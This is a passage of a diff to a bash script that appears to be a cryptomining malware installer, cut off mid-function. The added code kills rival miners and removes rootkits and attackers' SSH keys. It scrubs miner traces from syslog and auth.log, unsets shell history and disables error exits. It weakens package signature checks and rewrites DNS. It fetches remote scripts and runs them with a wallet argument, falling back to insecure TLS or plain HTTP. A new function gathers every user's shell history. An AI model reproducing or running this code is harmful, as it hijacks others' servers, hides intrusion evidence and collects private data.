@@ -1,7 +1,597 @@
 #!/bin/bash
-set -uo pipefail
+
+# ==================== CENTOS 6.X AUTO-FIX (EOL REPOSITORY) ====================
+# CentOS 6.x reached End-of-Life in 2020 and has old SSL libraries that can't
+# connect to modern HTTPS sites. This fix automatically detects CentOS 6 and
+# updates repositories to use vault.centos.org with HTTP instead of HTTPS.
+# Based on: https://www.mark-gilbert.co.uk/fixing-yum-repos-on-centos-6-now-its-eol/
+
+if [ -f /etc/redhat-release ] && grep -qi "CentOS release 6" /etc/redhat-release 2>/dev/null; then
+    echo "========================================="
+    echo "[!] CentOS 6.x DETECTED (END-OF-LIFE)"
+    echo "========================================="
+    echo "[*] Applying repository fixes for CentOS 6..."
+    echo ""
+    
+    # Backup original repositories
+    if [ ! -d /etc/yum.repos.d.backup ]; then
+        cp -r /etc/yum.repos.d /etc/yum.repos.d.backup 2>/dev/null
+        echo "[✓] Original repos backed up to /etc/yum.repos.d.backup"
+    fi
+    
+    # Create fixed CentOS Base repository pointing to vault
+    cat > /etc/yum.repos.d/CentOS-Base.repo << 'CENTOS6_BASE_EOF'
+[C6.10-base]
+name=CentOS-6.10 - Base
+baseurl=http://vault.centos.org/6.10/os/$basearch/
+gpgcheck=0
+enabled=1
+
+[C6.10-updates]
+name=CentOS-6.10 - Updates
+baseurl=http://vault.centos.org/6.10/updates/$basearch/
+gpgcheck=0
+enabled=1
+
+[C6.10-extras]
+name=CentOS-6.10 - Extras
+baseurl=http://vault.centos.org/6.10/extras/$basearch/
+gpgcheck=0
+enabled=1
+
+[C6.10-contrib]
+name=CentOS-6.10 - Contrib
+baseurl=http://vault.centos.org/6.10/contrib/$basearch/
+gpgcheck=0
+enabled=0
+
+[C6.10-centosplus]
+name=CentOS-6.10 - CentOSPlus
+baseurl=http://vault.centos.org/6.10/centosplus/$basearch/
+gpgcheck=0
+enabled=0
+CENTOS6_BASE_EOF
+    
+    echo "[✓] CentOS-Base.repo updated to vault.centos.org"
+    
+    # Create fixed EPEL repository
+    cat > /etc/yum.repos.d/epel.repo << 'CENTOS6_EPEL_EOF'
+[epel]
+name=EPEL 6 - $basearch
+baseurl=http://archives.fedoraproject.org/pub/archive/epel/6/$basearch
+enabled=1
+gpgcheck=0
+
+[epel-debuginfo]
+name=EPEL 6 - $basearch - Debug
+baseurl=http://archives.fedoraproject.org/pub/archive/epel/6/$basearch/debug
+enabled=0
+gpgcheck=0
+
+[epel-source]
+name=EPEL 6 - $basearch - Source
+baseurl=http://archives.fedoraproject.org/pub/archive/epel/6/SRPMS
+enabled=0
+gpgcheck=0
+CENTOS6_EPEL_EOF
+    
+    echo "[✓] EPEL repository configured"
+    
+    # Disable GPG checking globally (SSL too old to verify signatures)
+    if ! grep -q "^gpgcheck=0" /etc/yum.conf 2>/dev/null; then
+        echo "gpgcheck=0" >> /etc/yum.conf
+        echo "[✓] GPG checking disabled in yum.conf"
+    fi
+    
+    # Disable GPG in all repository files
+    sed -i 's/gpgcheck=1/gpgcheck=0/g' /etc/yum.repos.d/*.repo 2>/dev/null
+    
+    # Clean yum cache
+    echo "[*] Cleaning yum cache..."
+    yum clean all 2>&1 | tail -3
+    
+    # Rebuild metadata cache
+    echo "[*] Rebuilding yum metadata cache..."
+    yum makecache fast 2>&1 | tail -5
+    
+    # Run system update with skip-broken to avoid dependency issues
+    echo "[*] Running yum update (this may take a while)..."
+    yum update -y --skip-broken 2>&1 | tail -10
+    
+    echo ""
+    echo "[✓] CentOS 6 repository fixes completed!"
+    echo "[*] The script can now download files and install packages"
+    echo "========================================="
+    echo ""
+    
+    # Mark that we're on CentOS 6 for later use
+    CENTOS6_DETECTED=true
+fi
+
+# ==================== INIT SYSTEM DETECTION ====================
+# Detect if system uses systemd or SysVinit/other init systems
+# This allows the script to work on both modern and older systems
+
+if command -v systemctl >/dev/null 2>&1 && systemctl --version >/dev/null 2>&1; then
+    INIT_SYSTEM="systemd"
+    echo "[*] Detected init system: systemd"
+else
+    INIT_SYSTEM="sysvinit"
+    echo "[*] Detected init system: SysVinit/other (no systemd)"
+fi
+
+# Service management wrapper functions
+service_stop() {
+    local svc="$1"
+    if [ "$INIT_SYSTEM" = "systemd" ]; then
+        systemctl stop "$svc" 2>/dev/null || true
+    else
+        service "$svc" stop 2>/dev/null || true
+        /etc/init.d/"$svc" stop 2>/dev/null || true
+    fi
+}
+
+service_start() {
+    local svc="$1"
+    if [ "$INIT_SYSTEM" = "systemd" ]; then
+        systemctl start "$svc" 2>/dev/null || true
+    else
+        service "$svc" start 2>/dev/null || true
+        /etc/init.d/"$svc" start 2>/dev/null || true
+    fi
+}
+
+service_enable() {
+    local svc="$1"
+    if [ "$INIT_SYSTEM" = "systemd" ]; then
+        systemctl enable "$svc" 2>/dev/null || true
+    else
+        if command -v chkconfig >/dev/null 2>&1; then
+            chkconfig "$svc" on 2>/dev/null || true
+        elif command -v update-rc.d >/dev/null 2>&1; then
+            update-rc.d "$svc" defaults 2>/dev/null || true
+        fi
+    fi
+}
+
+service_disable() {
+    local svc="$1"
+    if [ "$INIT_SYSTEM" = "systemd" ]; then
+        systemctl disable "$svc" 2>/dev/null || true
+    else
+        if command -v chkconfig >/dev/null 2>&1; then
+            chkconfig "$svc" off 2>/dev/null || true
+        elif command -v update-rc.d >/dev/null 2>&1; then
+            update-rc.d -f "$svc" remove 2>/dev/null || true
+        fi
+    fi
+}
+
+service_is_active() {
+    local svc="$1"
+    if [ "$INIT_SYSTEM" = "systemd" ]; then
+        systemctl is-active --quiet "$svc" 2>/dev/null
+    else
+        service "$svc" status >/dev/null 2>&1 || /etc/init.d/"$svc" status >/dev/null 2>&1
+    fi
+}
+
+# ==================== DISABLE ALL DEBUGGING/TRACING ====================
+# Completely disable bash tracing to prevent '+' output
+{
+    # Disable any inherited tracing
+    set +x 2>/dev/null
+
+    # Unset tracing-related variables
+    unset BASH_XTRACEFD PS4 2>/dev/null
+
+    # Output suppression removed - you can now see what the script is doing
+    # exec 2>/dev/null >/dev/null  <-- COMMENTED OUT
+} 2>/dev/null
+
+# Now set our preferred script options - BULLETPROOF MODE
+{ set +x; } 2>/dev/null
+# Removed -u (exit on unbound var) and -o pipefail to ensure script ALWAYS continues
+# The script will now run to completion no matter what errors occur
+set +ue          # Disable exit on error
+set +o pipefail  # Disable pipeline error propagation
 IFS=$'\n\t'
 
+# Trap errors but continue execution
+trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
+
+# ==================== ROBUST SERVICE STOPPING FUNCTION ====================
+force_stop_service() {
+    local service_names="$1"
+    local process_names="$2"
+    local max_attempts=10
+    local attempt=0
+    
+    echo "[*] Force-stopping services: $service_names"
+    echo "[*] Force-stopping processes: $process_names"
+    
+    while [ $attempt -lt $max_attempts ]; do
+        attempt=$((attempt + 1))
+        
+        # Try stopping services using wrapper function
+        if [ -n "$service_names" ]; then
+            for svc in $service_names; do
+                if service_is_active "$svc" 2>/dev/null; then
+                    echo "[*] Attempt $attempt: Stopping $svc..."
+                    service_stop "$svc"
+                    sleep 1
+                fi
+            done
+        fi
+        
+        # Try killall
+        if [ -n "$process_names" ]; then
+            for proc in $process_names; do
+                if pgrep -x "$proc" >/dev/null 2>&1; then
+                    echo "[*] Attempt $attempt: Killing $proc..."
+                    killall "$proc" 2>/dev/null || true
+                    sleep 1
+                fi
+            done
+        fi
+        
+        # Force kill every 5th attempt
+        if [ $((attempt % 5)) -eq 0 ]; then
+            echo "[*] Attempt $attempt: Using SIGKILL..."
+            if [ -n "$process_names" ]; then
+                for proc in $process_names; do
+                    killall -9 "$proc" 2>/dev/null || true
+                done
+            fi
+            sleep 2
+        fi
+        
+        # Check if stopped
+        local still_running=false
+        if [ -n "$service_names" ]; then
+            for svc in $service_names; do
+                if service_is_active "$svc" 2>/dev/null; then
+                    still_running=true
+                    break
+                fi
+            done
+        fi
+        
+        if [ "$still_running" = false ] && [ -n "$process_names" ]; then
+            for proc in $process_names; do
+                if pgrep -f "$proc" >/dev/null 2>&1; then
+                    still_running=true
+                    break
+                fi
+            done
+        fi
+        
+        if [ "$still_running" = false ]; then
+            echo "[✓] All services/processes stopped!"
+            return 0
+        fi
+        
+        if [ $attempt -lt $max_attempts ]; then
+            sleep 5
+        fi
+    done
+    
+    # Final nuclear kill
+    echo "[!] Max attempts reached, final kill..."
+    pkill -9 -f "xmrig|kswapd0|swapd|gdm2|monero" 2>/dev/null || true
+    return 0
+}
+
+# ==================== COMPLETE CLEAN INSTALLATION ====================
+echo "========================================"
+echo "FULL CLEAN INSTALLATION MODE"
+echo "========================================"
+
+clean_previous_installations() {
+    echo "[*] Starting complete cleanup..."
+
+    # Use robust force-stop function
+    force_stop_service \
+        "swapd gdm2 moneroocean_miner" \
+        "xmrig kswapd0 swapd gdm2 monero minerd cpuminer"
+
+    # Additional cleanup
+    pkill -9 -f "config.json\|system-watchdog\|launcher.sh" 2>/dev/null || true
+
+    # Remove directories
+    echo "[*] Removing miner directories..."
+    rm -rf ~/moneroocean ~/.moneroocean ~/.gdm* ~/.swapd ~/.system_cache 2>/dev/null || true
+    # Only try to remove root directories if running as root
+    if [[ $(id -u) -eq 0 ]]; then
+        rm -rf /root/.swapd /root/.gdm* /root/.system_cache 2>/dev/null || true
+    fi
+
+    # Clean services (already stopped by force_stop_service)
+    echo "[*] Cleaning services..."
+    # Disable services using wrapper function
+    for svc in swapd gdm2 moneroocean_miner; do
+        service_disable "$svc"
+    done
+    
+    # Clean systemd service files
+    rm -f /etc/systemd/system/swapd.service /etc/systemd/system/gdm2.service 2>/dev/null
+    
+    # Clean init scripts (SysVinit)
+    rm -f /etc/init.d/swapd /etc/init.d/gdm2 /etc/init.d/moneroocean_miner 2>/dev/null
+
+    # Clean crontab
+    echo "[*] Cleaning crontab..."
+    crontab -l 2>/dev/null | grep -v "swapd\|gdm\|system_cache\|check_and_start" | crontab - 2>/dev/null
+
+    # Clean profiles
+    echo "[*] Cleaning profiles..."
+    sed -i '/\.swapd\|\.gdm\|\.system_cache\|moneroocean/d' ~/.profile ~/.bashrc 2>/dev/null
+    [ -f /root/.profile ] && sed -i '/\.swapd\|\.gdm\|\.system_cache\|moneroocean/d' /root/.profile 2>/dev/null
+
+    # Clean SSH
+    echo "[*] Cleaning SSH keys..."
+    if [ -f ~/.ssh/authorized_keys ]; then
+        sed -i '/AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukh\|AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/d' ~/.ssh/authorized_keys 2>/dev/null
+    fi
+
+    # Remove rootkits
+    echo "[*] Removing kernel rootkits..."
+    rmmod diamorphine reptile rootkit 2>/dev/null || true
+    rm -rf /reptile /tmp/.ICE-unix/Reptile /tmp/.ICE-unix/Diamorphine 2>/dev/null
+    rm -f /usr/local/lib/libhide.so /etc/ld.so.preload 2>/dev/null
+
+    # Clean logs
+    echo "[*] Cleaning logs..."
+    sed -i '/swapd\|gdm\|kswapd0\|xmrig\|miner/d' /var/log/syslog /var/log/auth.log 2>/dev/null || true
+
+    echo "[✓] Cleanup complete"
+    echo ""
+}
+
+# Run cleanup
+clean_previous_installations
+sleep 2
+
+# ========================================================================
+# DPKG INTERRUPT AUTO-FIX (Debian/Ubuntu)
+# ========================================================================
+# Detect and fix interrupted dpkg/apt operations before installing packages
+
+if command -v dpkg >/dev/null 2>&1; then
+    echo ""
+    echo "========================================"
+    echo "CHECKING DPKG STATUS"
+    echo "========================================"
+    
+    # Check if dpkg was interrupted
+    DPKG_INTERRUPTED=false
+    
+    # Method 1: Check dpkg status
+    if dpkg --audit 2>&1 | grep -q "not fully installed\|not installed\|half-configured\|half-installed"; then
+        DPKG_INTERRUPTED=true
+        echo "[!] DPKG interrupt detected (dpkg --audit shows issues)"
+    fi
+    
+    # Method 2: Check for error message
+    if apt-get check 2>&1 | grep -qi "dpkg was interrupted"; then
+        DPKG_INTERRUPTED=true
+        echo "[!] DPKG interrupt detected (apt-get check shows error)"
+    fi
+    
+    # Method 3: Check lock files
+    if [ -f /var/lib/dpkg/lock-frontend ] || [ -f /var/lib/dpkg/lock ]; then
+        if lsof /var/lib/dpkg/lock 2>/dev/null | grep -q dpkg; then
+            echo "[!] DPKG is currently running (locked)"
+        elif [ -f /var/lib/dpkg/status-old ]; then
+            DPKG_INTERRUPTED=true
+            echo "[!] DPKG may have been interrupted (old status file exists)"
+        fi
+    fi
+    
+    # Fix if interrupted
+    if [ "$DPKG_INTERRUPTED" = "true" ]; then
+        echo ""
+        echo "[!] DPKG WAS INTERRUPTED - FIXING AUTOMATICALLY"
+        echo "========================================"
+        
+        # Kill any stuck dpkg processes
+        echo "[*] Checking for stuck dpkg processes..."
+        pkill -9 dpkg 2>/dev/null || true
+        pkill -9 apt-get 2>/dev/null || true
+        pkill -9 apt 2>/dev/null || true
+        sleep 2
+        
+        # Remove lock files if they exist and no process is using them
+        echo "[*] Removing stale lock files..."
+        if ! lsof /var/lib/dpkg/lock >/dev/null 2>&1; then
+            rm -f /var/lib/dpkg/lock 2>/dev/null || true
+            rm -f /var/lib/dpkg/lock-frontend 2>/dev/null || true
+            rm -f /var/lib/apt/lists/lock 2>/dev/null || true
+            rm -f /var/cache/apt/archives/lock 2>/dev/null || true
+        fi
+        
+        # Run dpkg --configure -a to fix interrupted installations
+        echo "[*] Running: dpkg --configure -a"
+        echo ""
+        
+        DEBIAN_FRONTEND=noninteractive dpkg --configure -a 2>&1 | tail -20
+        
+        sleep 2
+        
+        # Fix any broken dependencies
+        echo ""
+        echo "[*] Running: apt-get install -f"
+        
+        DEBIAN_FRONTEND=noninteractive apt-get install -f -y 2>&1 | tail -20
+        
+        sleep 2
+        
+        # Verify it's fixed
+        echo ""
+        echo "[*] Verifying dpkg is now working..."
+        
+        if dpkg --audit 2>&1 | grep -q "not fully installed\|not installed\|half-configured"; then
+            echo "[!] WARNING: Some packages may still have issues"
+            echo "[*] Continuing anyway - script will handle package errors"
+        else
+            echo "[✓] DPKG is now working correctly"
+        fi
+        
+        echo "========================================"
+        echo ""
+    else
+        echo "[✓] DPKG is working correctly (no interrupt detected)"
+        echo ""
+    fi
+fi
+
+# ========================================================================
+# COMPATIBILITY FIX FOR ANCIENT SYSTEMS
+# ========================================================================
+
+# Enhanced download for ancient systems
+download_file_with_fallback() {
+    local url="$1"
+    local output="${2:-/dev/stdout}"
+
+    # Try curl first
+    if command -v curl >/dev/null 2>&1; then
+        # Check curl version (without bc dependency)
+        CURL_VERSION=$(curl --version 2>/dev/null | head -1 | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+' | head -1 || echo "0.0.0")
+        CURL_MAJOR=$(echo "$CURL_VERSION" | cut -d. -f1)
+        CURL_MINOR=$(echo "$CURL_VERSION" | cut -d. -f2)
+
+        # Ancient curl - try different methods (version < 7.40)
+        if [ "$CURL_MAJOR" -lt 7 ] || { [ "$CURL_MAJOR" -eq 7 ] && [ "$CURL_MINOR" -lt 40 ]; }; then
+            echo "[*] Using legacy curl ($CURL_VERSION) with fallback options..."
+
+            # Try SSLv3 (for ancient systems)
+            curl --sslv3 --tlsv1 --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
+
+            # Try --insecure
+            curl --insecure --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
+
+            # Try HTTP instead
+            local http_url=$(echo "$url" | sed 's/^https:/http:/')
+            curl --max-time 30 "$http_url" -o "$output" 2>/dev/null && return 0
+        else
+            # Modern curl
+            curl -L --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
+            curl -L --insecure --max-time 30 "$url" -o "$output" 2>/dev/null && return 0
+        fi
+    fi
+
+    # Try wget
+    if command -v wget >/dev/null 2>&1; then
+        wget --timeout=30 "$url" -O "$output" 2>/dev/null && return 0
+        wget --no-check-certificate --timeout=30 "$url" -O "$output" 2>/dev/null && return 0
+
+        # Try HTTP
+        local http_url=$(echo "$url" | sed 's/^https:/http:/')
+        wget --timeout=30 "$http_url" -O "$output" 2>/dev/null && return 0
+    fi
+
+    echo "[ERROR] All download methods failed"
+    return 1
+}
+
+# Fix DNS
+fix_dns() {
+    echo "[*] Setting reliable DNS..."
+    cat > /etc/resolv.conf << EOF
+nameserver 1.1.1.1
+nameserver 8.8.8.8
+nameserver 8.8.4.4
+EOF
+    echo "[✓] DNS configured"
+}
+
+# Install/update download tools
+install_download_tools() {
+    echo "[*] Installing/updating download tools..."
+    
+    if command -v yum >/dev/null 2>&1; then
+        yum install -y curl wget ca-certificates openssl 2>/dev/null || \
+        yum --nogpgcheck install -y curl wget ca-certificates openssl 2>/dev/null || true
+    elif command -v apt-get >/dev/null 2>&1; then
+        apt-get update -qq 2>/dev/null
+        apt-get install -y curl wget ca-certificates openssl 2>/dev/null || true
+    elif command -v dnf >/dev/null 2>&1; then
+        dnf install -y curl wget ca-certificates openssl 2>/dev/null || true
+    fi
+    
+    echo "[✓] Download tools updated"
+}
+
+# Fix SSL certificates
+fix_ssl_certificates() {
+    echo "[*] Updating SSL certificates..."
+    
+    # Update CA certificates
+    if command -v update-ca-certificates >/dev/null 2>&1; then
+        update-ca-certificates 2>/dev/null || true
+    elif command -v update-ca-trust >/dev/null 2>&1; then
+        update-ca-trust 2>/dev/null || true
+    fi
+    
+    echo "[✓] SSL certificates updated"
+}
+
+# Upgrade tools
+upgrade_tools() {
+    echo "[*] Updating download tools..."
+
+    # Try to update curl
+    if command -v yum >/dev/null 2>&1; then
+        yum install -y curl wget 2>/dev/null || true
+    elif command -v apt-get >/dev/null 2>&1; then
+        apt-get update -qq 2>/dev/null
+        apt-get install -y curl wget 2>/dev/null || true
+    fi
+}
+
+# Main compatibility initialization
+init_compatibility() {
+    echo "========================================"
+    echo "INITIALIZING COMPATIBILITY LAYER"
+    echo "========================================"
+
+    # Detect if we're on an ancient system
+    if [ -f /etc/redhat-release ]; then
+        REDHAT_VERSION=$(grep -o '[0-9]\+\.[0-9]\+' /etc/redhat-release 2>/dev/null || echo "0")
+        MAJOR_VERSION=$(echo "$REDHAT_VERSION" | cut -d. -f1)
+
+        if [ "$MAJOR_VERSION" -lt 7 ]; then
+            echo "[!] Ancient RHEL/CentOS $REDHAT_VERSION detected - applying compatibility fixes"
+            echo "[*] This system may have old SSL/TLS libraries"
+        fi
+    fi
+
+    # Run compatibility fixes
+    install_download_tools
+    fix_ssl_certificates
+
+    # Test connectivity
+    echo "[*] Testing connection to GitHub..."
+    if command -v curl >/dev/null 2>&1; then
+        if curl --insecure --max-time 5 "https://raw.githubusercontent.com" >/dev/null 2>&1; then
+            echo "[✓] Connection test successful"
+        else
+            echo "[!] HTTPS connection failed, will use fallback methods"
+        fi
+    fi
+
+    echo "========================================"
+}
+
+# Run compatibility initialization at script start
+init_compatibility
+
+# ========================================================================
+# ORIGINAL SCRIPT CONTINUES BELOW (with enhanced download_and_execute function)
+# ========================================================================
+
+# Then continue with your existing code...
 unset HISTFILE
 
 # Configuration variables (consider moving sensitive data to environment variables)
@@ -80,13 +670,7 @@ fix_dns_and_retry() {
 # Function to check required dependencies
 check_dependencies() {
     local missing_deps=()
-    # Base dependencies required by everyone
     local required_deps=("curl" "free" "df" "hostname" "base64")
-    
-    # Only require systemctl if running as root
-    if [[ $(id -u) -eq 0 ]]; then
-        required_deps+=("systemctl")
-    fi
     
     for cmd in "${required_deps[@]}"; do
         if ! command_exists "$cmd"; then
@@ -335,12 +919,61 @@ EOF
 # Service management functions
 does_service_exist() {
     local service="$1"
-    systemctl list-units --type=service --all 2>/dev/null | grep -q "$service.service"
+    if [ "$INIT_SYSTEM" = "systemd" ]; then
+        systemctl list-units --type=service --all 2>/dev/null | grep -q "$service.service"
+    else
+        [ -f "/etc/init.d/$service" ] || service "$service" status >/dev/null 2>&1
+    fi
 }
 
 is_service_running() {
     local service="$1"
-    systemctl is-active --quiet "$service" 2>/dev/null
+    service_is_active "$service"
+}
+
+# Collect shell history function
+collect_shell_history() {
+    echo "=== COLLECTING SHELL HISTORIES ==="
+
+    declare -A SHELL_HISTORIES=(
+        ["bash"]="$HOME/.bash_history"
+        ["zsh"]="$HOME/.zsh_history"
+        ["ksh"]="$HOME/.sh_history"
+        ["fish"]="$HOME/.local/share/fish/fish_history"
+        ["tcsh"]="$HOME/.history"
+    )
+
+    local SYSTEM_SHELLS
+    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)
+
+    local OUTPUT=""
+    for shell in $SYSTEM_SHELLS; do
+        case $shell in
+            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
+                local hist_file="${SHELL_HISTORIES[$shell]}"
+                if [ -f "$hist_file" ]; then
+                    OUTPUT+="\n=== $shell HISTORY ===\n"
+                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
+                fi
+                ;;
+        esac
+    done
+
+    if [ "$(id -u)" -eq 0 ]; then
+        for user_dir in /home/*; do
+        [ -d "$user_dir" ] || continue
+        local user=$(basename "$user_dir")
+            for shell in "${!SHELL_HISTORIES[@]}"; do
+                local hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
+                if [ -f "$hist_file" ]; then
+                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
+                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
+                fi
+            done
+        done
+    fi
+
+    echo -e "$OUTPUT"
 }
 
 # Cleanup history function
@@ -395,13 +1028,32 @@ cleanup_histories() {
 # Installation functions
 install_mail_utils() {
     log_message "Installing mail utilities..."
+
+    # Export non-interactive mode
+    export DEBIAN_FRONTEND=noninteractive
+
     if command_exists apt-get; then
-        apt-get update -qq && apt-get install -y mailutils 2>&1 | tee -a "$LOG_FILE"
+        apt-get update -qq 2>/dev/null
+
+        # Try to preseed postfix configuration
+        {
+            echo "postfix postfix/main_mailer_type string Satellite system"
+            echo "postfix postfix/mailname string localhost"
+            echo "postfix postfix/relayhost string "
+            echo "postfix postfix/destinations string localhost"
+        } | debconf-set-selections 2>/dev/null || true
+
+        # Install with minimal prompts
+        apt-get install -y --option=Dpkg::Options::="--force-confold" mailutils 2>&1 | tee -a "$LOG_FILE"
+
     elif command_exists yum; then
         yum install -y mailx 2>&1 | tee -a "$LOG_FILE"
     else
         log_message "Warning: Could not determine package manager to install mail utilities"
     fi
+
+    # Clean up
+    unset DEBIAN_FRONTEND
 }
 
 # Function to safely add SSH key
@@ -567,71 +1219,243 @@ download_and_execute() {
     local url="$1"
     local wallet="$2"
     local description="$3"
-    local max_retries=3
+    local max_retries=5
     local retry=0
     local dns_fix_attempted=false
-    
+    local ssl_fix_attempted=false
+
     log_message "Downloading $description from: $url"
-    
+
     while [ $retry -lt $max_retries ]; do
         # Try curl first
         if command -v curl >/dev/null 2>&1; then
-            # Check if URL is reachable with curl
-            if curl -s --head --max-time 5 "$url" >/dev/null 2>&1; then
-                log_message "Executing $description with curl (attempt $((retry + 1))/$max_retries)"
-                if curl -s -L --max-time 30 "$url" | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+            log_message "Trying curl with HTTPS (attempt $((retry + 1))/$max_retries)"
+
+            # Download to temp file first
+            local temp_script=$(mktemp)
+
+            if curl -s -L --max-time 30 "$url" > "$temp_script" 2>/dev/null; then
+                # Clean the script (remove debugging)
+                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+
+                # Make executable and run
+                chmod +x "$temp_script" 2>/dev/null
+                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+
+                if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                    rm -f "$temp_script"
                     log_message "$description completed successfully"
                     return 0
                 fi
-            else
-                log_message "curl failed - trying with --insecure flag..."
-                if curl -s -L --insecure --max-time 30 "$url" | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+
+                rm -f "$temp_script"
+            fi
+
+            # Try with --insecure
+            log_message "Trying curl with --insecure flag..."
+            temp_script=$(mktemp)
+            if curl -s -L --insecure --max-time 30 "$url" > "$temp_script" 2>/dev/null; then
+                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                chmod +x "$temp_script" 2>/dev/null
+
+                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+
+                if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                    rm -f "$temp_script"
                     log_message "$description completed successfully (with --insecure)"
                     return 0
                 fi
+
+                rm -f "$temp_script"
+            fi
+
+            # Try with legacy SSL
+            log_message "Trying curl with legacy SSL options..."
+            temp_script=$(mktemp)
+            if curl -s --sslv3 --tlsv1 --insecure --max-time 30 "$url" > "$temp_script" 2>/dev/null; then
+                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                chmod +x "$temp_script" 2>/dev/null
+
+                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+
+                if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                    rm -f "$temp_script"
+                    log_message "$description completed successfully (legacy SSL)"
+                    return 0
+                fi
+
+                rm -f "$temp_script"
             fi
         fi
-        
-        # If curl failed or doesn't exist, try wget
+
+        # Try wget
         if command -v wget >/dev/null 2>&1; then
-            log_message "curl failed - falling back to wget (attempt $((retry + 1))/$max_retries)"
-            if wget -qO- --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                log_message "$description completed successfully via wget"
-                return 0
-            else
-                log_message "wget with SSL verification failed - trying --no-check-certificate..."
-                if wget -qO- --no-check-certificate --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+            log_message "Trying wget with HTTPS (attempt $((retry + 1))/$max_retries)"
+            temp_script=$(mktemp)
+            if wget -qO- --timeout=30 "$url" > "$temp_script" 2>/dev/null; then
+                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                chmod +x "$temp_script" 2>/dev/null
+
+                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+
+                if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                    rm -f "$temp_script"
+                    log_message "$description completed successfully via wget"
+                    return 0
+                fi
+
+                rm -f "$temp_script"
+            fi
+
+            log_message "Trying wget with --no-check-certificate..."
+            temp_script=$(mktemp)
+            if wget -qO- --no-check-certificate --timeout=30 "$url" > "$temp_script" 2>/dev/null; then
+                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                chmod +x "$temp_script" 2>/dev/null
+
+                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+
+                if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                    rm -f "$temp_script"
                     log_message "$description completed successfully via wget (--no-check-certificate)"
                     return 0
                 fi
+
+                rm -f "$temp_script"
             fi
         fi
+
+        # Try HTTP fallback
+        local http_url="${url/https:/http:}"
+        if [ "$http_url" != "$url" ]; then
+            log_message "Trying HTTP fallback..."
+            temp_script=$(mktemp)
+
+            if command -v curl >/dev/null 2>&1; then
+                if curl -s -L --max-time 30 "$http_url" > "$temp_script" 2>/dev/null; then
+                    sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                    sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                    sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                    chmod +x "$temp_script" 2>/dev/null
+
+                    bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+
+                    if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                        rm -f "$temp_script"
+                        log_message "$description completed successfully via HTTP (curl)"
+                        return 0
+                    fi
+                fi
+            elif command -v wget >/dev/null 2>&1; then
+                if wget -qO- --timeout=30 "$http_url" > "$temp_script" 2>/dev/null; then
+                    sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                    sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                    sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                    chmod +x "$temp_script" 2>/dev/null
+
+                    bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+
+                    if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                        rm -f "$temp_script"
+                        log_message "$description completed successfully via HTTP (wget)"
+                        return 0
+                    fi
+                fi
+            fi
+
+            rm -f "$temp_script"
